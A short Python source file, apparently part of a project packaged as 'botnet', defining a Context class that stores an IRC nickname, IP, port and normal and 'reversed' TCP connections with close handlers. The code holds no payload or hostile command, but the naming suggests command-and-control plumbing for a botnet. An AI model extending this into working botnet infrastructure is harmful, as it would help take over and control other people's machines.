from botnet.tcp import tcp_services

class Context:
    def __init__(self, ircNick, ip, port):
        self.ircNick = ircNick
        self.ip = ip
        self.port = port
        self.connected = False
        self.TcpConnection = None
        self.TcpReversedConnection = None

    def get_ircNick(self):
        return self.ircNick
    
    def get_ip(self):
        return self.ip
    
    def get_port(self):
        return self.port
    
    def set_tcp_connection(self, tcp_connection):
        if tcp_connection is None:
            return
        
        self.TcpConnection = tcp_connection
        self.TcpConnection.onConnectionClosed.subscribe(self.onConnectionClosed)

    def get_tcp_connection(self):
        return self.TcpConnection
    
    def set_reversed_tcp_connection(self, tcp_connection):
        if tcp_connection is None:
            return  
        
        self.TcpReversedConnection = tcp_connection
        self.TcpReversedConnection.onConnectionClosed.subscribe(self.onReversedConnectionClosed)

    def get_reversed_tcp_connection(self):
        return self.TcpReversedConnection

    async def onConnectionClosed(self, *args, **kwargs):
        self.TcpConnection = None

    async def onReversedConnectionClosed(self, *args, **kwargs):
        self.TcpReversedConnection = None

